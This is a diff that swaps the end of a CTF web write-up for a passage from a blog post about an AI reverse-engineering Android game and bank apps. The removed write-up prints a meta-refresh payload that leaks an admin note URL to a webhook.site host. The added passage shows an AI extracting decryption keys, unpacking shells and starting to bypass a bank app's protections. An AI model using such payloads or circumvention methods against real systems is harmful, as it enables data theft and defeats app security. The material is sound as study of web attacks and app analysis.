@@ -1,173 +1,107 @@
-</html>
+However, since this key could not decrypt the encrypted JSC, AI took a different approach and used Unicorn Engine to simulate the execution of this SO, but there was no progress, as it got stuck after running for a while.
+
+Since static analysis did not yield results, AI switched to dynamic analysis, installing an Android emulator and Frida to hook multiple parameters. Both `Memory.scanSync` and `fopen` failed, and later AI looked for the functions exported by `libcocos2djs.so`, discovering that `xxtea_decrypt` was public, so AI hooked `xxtea_decrypt`.
+
+After running the game, AI obtained the correct key and restored the encrypted JSC files, which also contained the game logic and configuration.
+
+After reaching this point, since the game had already been restored, AI stopped. I wanted to continue testing its capabilities, so I said to it, "Why don't you try to unpack that shell?" As a result, the protection of that shell was quite weak, and after running it, frida-dexdump quickly dumped all the DEX.
+
+This case switched from static analysis to dynamic analysis with hooking, and also conveniently unpacked a shell (although the shell was quite weak).
+
+### Case 3: Unity Game
+
+After unpacking the APK, there were three SO files: libil2cpp, libunity, and libxlua. It was speculated that the core logic was at the Lua layer. AI then used Il2CppDumper to unpack the global-metadata, extracting some C# files and DLLs. After decompiling with ILSpy, it was found that they were all classes with empty implementations (seemingly how IL2CPP works?).
+
+Using jadx to decompile Java also yielded some SDKs, with no game logic, so AI focused on finding the Lua files.
+
+Using UnityPy to scan all asset bundles for TextAssets, AI only found four Lua scripts, none of which contained the core game logic. From the C# code AI obtained earlier, AI found some strings indicating that the game had a hot update system. AI attempted to download using the URLs and AES key and IV found within, but all returned 404 errors and could not be downloaded.
+
+
+Later, AI turned back to the asset bundle and found a bundle containing 3000 TextAssets (which AI didn't check the first time). From the file names, AI confirmed they were encrypted Lua scripts.
+
+Upon observation, AI noticed that many of these files had the same first 6 bytes, speculating that they were the beginning of Lua 5.3 compiled bytecode. AI attempted to reverse-engineer the key using XOR but found it impossible to decrypt. Then AI tried several different encryption methods, various AES modes, but still couldn't decrypt it.
+
+Next, AI decompiled libil2cpp and saw that the decryption process indeed used XOR, and the key was a 6-byte sequence that repeated. In C#, AI couldn't find it using a static method with global-metadata, and AI hit a roadblock, so I intervened.
+
+I asked him, "Would dynamic analysis be faster?"
+
+The AI provided two options: one was Frida hook, and the other was Unicorn simulation. I chose the latter, and during the script writing, the AI cleverly cracked it using a different method. It said it observed those files and found that the first 54 bytes of half of them were identical, and they were a repeating sequence of 6 bytes: `c3 70 43 22 34 a6`.
+
+If the key is a 6-byte repeating XOR, then the repetition in the ciphertext indicates that the plaintext is also repeated. What Lua file would have so many identical characters at the beginning?
+
+The AI boldly guessed: "Comments." Lua comments start with `--`, and many frameworks have a habit of placing a long comment starting with `-----` as a separator. Based on this assumption, it XORed to obtain the key, then decrypted the Lua scripts, discovering that everything was unlocked, revealing readable source code.
+
+The key to this case is that the AI is observant and employs various methods to attempt decryption. Below is the process the AI followed while solving this case, showing that it tried many methods in between but none worked, so it moved on to the next method:
+
+```
+XAPK unpack
+  ↓
+Il2CppDumper + ILSpy + JADX  ← standard workflow, nothing unusual
+  ↓
+UnityPy scan → only 4 tool scripts found  ← assumed core logic is server-side
+  ↓
+Locate AppConfig → obtained CDN URL and AES key
+  ↓
+Attempt download → all 404  ← dead end
+  ↓
+Re-examine AssetBundle → found encrypted files!
+  ↓
+Inspect ciphertext → noticed repeating 6-byte pattern
+  ↓
+❌ Wrong assumption: Lua bytecode → derived incorrect keystream
+  ↓
+❌ Tried AES-CBC/ECB/OFB/CTR/CFB → none matched
+❌ Tried RC4 → no match
+❌ Tried .NET Random (10K seeds) → no match
+  ↓
+Reverse engineered libil2cpp.so → confirmed it's simple repeating XOR (not a stream cipher)
+  ↓
+❌ Tried statically finding ENCRYPT_BYTES → failed
+❌ Tried metadata defaultValues → failed
+❌ Tried ELF GOT/RELA → too deep
+  ↓
+Revisited ciphertext patterns → 1500 files share a 62-byte prefix
+  ↓
+💡 Hypothesis: plaintext is repeated '-' (0x2d) → XOR to recover key → decryption succeeded!
 ```
 
-Finally, I solved it. First blood.
+### Case Four: Another Unity Game
 
-## ptMD
+Similar to the previous one, it was also discovered to be Unity + Lua, but this time the decryption method was simpler. After dumping the C#, AI searched using "encrypt" as a keyword and directly found the LuaEncryption key and the custom asset bundle offset, needing to skip the first 12 bytes.
 
-This was the hardest challenge, only 1 solve.
+Next, AI skipped 12 bytes and used the key to XOR, obtaining the Lua bytecode (this time it was bytecode, not source code), which was then concatenated into a large asset.
 
-First, here's the author's writeup: https://github.com/xatophi/m0leconteaser2022-ptMD/blob/main/writeup.md
+Next, the AI wrote a Python script:
 
-In short, you have a page where you can insert any HTML, but the CSP is `script-src 'self'`, so you can't XSS. The goal is to steal the contents of the admin note. Since the URL is unique and there is no permission management, stealing the URL is enough. On the client's page, there is a `last` button that takes you to the latest note page.
+1. Skip the first 12 bytes of the custom header
+2. Scan all positions marked with `UnityFS\x00`
+3. Cut into independent bundles by offset
+4. Parse each bundle using UnityPy
+5. Extract all `.lua.bytes` files
+6. Decrypt each file using the key with XOR
 
-Since this was done using React, setting the URL to `/last` directly doesn't work because the notes are empty when first loaded, so it doesn't redirect to the latest note.
+This resulted in over 7000 Lua JIT bytecodes, which were then all fed into ljd to recover, yielding much more readable Lua source code, totaling 10 million lines.
 
-This is what the admin bot looks like:
+This case is similar to the first one; static analysis handled everything, directly finding the encryption key and method, recovering all resources.
 
-``` js
-async function visit(url) {
-    const browser = await puppeteer.launch({
-        headless: true,
-        args: [
-            '--disable-default-apps',
-            '--disable-extensions',
-            '--disable-gpu',
-            '--disable-sync',
-            '--disable-translate',
-            '--hide-scrollbars',
-            '--metrics-recording-only',
-            '--mute-audio',
-            '--no-first-run',
-            '--no-sandbox',
-            '--safebrowsing-disable-auto-update'
-        ],
-        executablePath: '/usr/bin/chromium'
-    })
+### Case Five: Obfuscated App
 
+This is a common app that has undergone some protection. The Java layer has been obfuscated to make it difficult to reverse, and the encryption and decryption logic is placed in the so files, accessed via JNI. When sending requests, it goes through some encryption plus a signature; if the algorithm cannot be cracked, it cannot be used outside the app.
 
-    try {
-        let page = await browser.newPage()
+The AI discovered that after obfuscation, it wrote a de-obfuscation script that restored several core class names, then began to reverse-engineer that section of the so file, using capstone + lief to disassemble the arm64-v8a version, restoring it to pseudo-C.
 
-        //login
-        await page.goto(LOGIN_URL)
+With this code, further analysis was possible, ultimately restoring the encryption and decryption algorithms along with the key.
 
-        await page.waitForSelector('#username')
-        await page.focus('#username')
-        await page.keyboard.type('admin', { delay: 10 })
-        await page.focus('#password')
-        await page.keyboard.type(ADMIN_PASSWORD, { delay: 10 })
+So, despite the obfuscation, the AI could derive some methods to attempt restoration through observation. Even if it couldn't restore everything, the AI's ability to read obfuscated code is far superior to that of a human.
 
-        await new Promise(resolve => setTimeout(resolve, 300))
-        await page.click('#submit')
-        await new Promise(resolve => setTimeout(resolve, 300))
+### Case Six: Bank-Level App
 
-        //await page.waitForNavigation({ waitUntil: 'networkidle2' })
-        console.log(await page.cookies())
+After trying the above cases, I decided to challenge the boss: a bank-level app.
 
-        // visit URL after auth
-        await page.goto(url, { timeout: 5000 })
-        await new Promise(resolve => setTimeout(resolve, 2000))
+Banks usually have stricter requirements for information security, so there will definitely be a lot of encryption, obfuscation, and packing, along with various anti-root and anti-hook mechanisms. Therefore, "bank-level" refers to similar specifications.
 
-        // logout
-        await page.click('#logout')
-        await new Promise(resolve => setTimeout(resolve, 2000))
+The goal is clear: to be able to open the app on a rooted emulator and hook to see the request content. Achieving this means that the internal protection mechanisms have been bypassed.
 
-        // close browser
-        await page.close()
-        await browser.close()
-    } catch (e) {
-        console.log(e)
-        await browser.close()
-        //throw (e)
-    }
+This bank-level app is packaged with what is commonly known as a commercial shell (meaning a shell specifically made by a certain company; these commercial solutions can be quite expensive, costing hundreds of thousands of TWD per year), with the main logic contained in a so file.
 
-}
-```
-
-The last step was strange to me when I was looking at it, which was clicking the logout button. I was wondering why I had to click that, but I found out later that it was also one of the keys.
-
-When I was solving it, I thought it might be related to the referrer policy, but using `<iframe referrerPolicy="unsafe-url"></iframe>` didn't seem to work.
-
-The answer is indeed related to this, but it's like this:
-
-``` html
-<meta name="referrer" content="unsafe-url" />
-<meta http-equiv="refresh" content="3;url=https://webhook.site/d485f13a-fd8b-4cfd-ad13-63d9b0f1f5ef" />
-```
-
-Use `<meta>` to set the referrer, and then use `meta refresh` to redirect the page after three seconds. Then, use CSS to hide the logout button behind the `last` button, so the admin bot will actually click the `last` button, jump to the note page, and then leak the URL based on the referrer policy.
-
-Finally, this answer broke three things I thought I knew:
-
-1. I thought meta had to be in the head to be effective.
-2. I thought the meta tag would be ineffective after being cleared.
-3. I thought that when puppeteer clicks a button, it is not related to the screen, but directly clicks the element.
-
-For these three things, we can do a little experiment.
-
-For the first point, I made a simple webpage:
-
-``` html
-<!DOCTYPE html>
-<html>
-
-<head>
-  <meta charset='utf-8'>
-</head>
-<body>
-  <h1>test</h1>
-  <meta name="referrer" content="unsafe-url" />
-  <meta http-equiv="Content-Security-Policy"
-      content="default-src 'self'; img-src https://*; child-src 'none';">
-  <meta http-equiv="refresh" content="3;url=http://example.org" />    
-
-</body>
-
-<body>
-```
-
-An error is seen in the console:
-
-> The Content Security Policy 'default-src 'self'; img-src https://*; child-src 'none';' was delivered via a <meta> element outside the document's <head>, which is disallowed. The policy has been ignored.
-
-However, after three seconds, it does redirect. So only the CSP header must be in the head, and the others can be in the body.
-
-For the second point, just modify the webpage:
-
-``` html
-<!DOCTYPE html>
-<html>
-
-<head>
-  <meta charset='utf-8'>
-</head>
-<body>
-  <h1>test</h1>
-  <meta name="referrer" content="unsafe-url" />
-  <meta http-equiv="refresh" content="3;url=http://example.org" />    
-  <script>
-    [...document.querySelectorAll('meta')].forEach(item => item.remove())
-    alert(document.body.innerHTML)
-  </script>
-</body>
-
-<body>
-```
-
-Although the meta tag is indeed removed, it still redirects after 3 seconds, so the effect is still there. It's really that magical.
-
-For the third point, the document states [page
-.click
-(selector[, options])](https://pptr.dev/#?product=Puppeteer&version=v14.1.0&show=api-pageclickselector-options)
-
-> This method fetches an element with selector, scrolls it into view if needed, and then uses page.mouse to click in the center of the element. If there's no element matching selector, the method throws an error.
-
-If you look at the source code, you can see: [src/common/JSHandle.ts](https://github.com/puppeteer/puppeteer/blob/84fc4227a4543724ba3841f35183f0081751f9a8/src/common/JSHandle.ts#L696)
-
-``` js
-/**
- * This method scrolls element into view if needed, and then
- * uses {@link Page.mouse} to click in the center of the element.
- * If the element is detached from DOM, the method throws an error.
- */
-async click(options: ClickOptions = {}): Promise<void> {
-  await this._scrollIntoViewIfNeeded();
-  const { x, y } = await this.clickablePoint(options.offset);
-  await this._page.mouse.click(x, y, options);
-}
-```
-
-Here, we are simply using `_page.mouse.click` to click on a specified coordinate. Therefore, if there is an element covering it, it will click on the element that is on top.
-
-I have learned a lot.
+The AI first used `objdump -h` to check the section headers and found two non-standard sections. Then, more than half of the `.text` section was encrypted and could not be disassembled, and the `.rodata` section was also completely encrypted. However, from other clues, it had already inferred which company's shell it was.
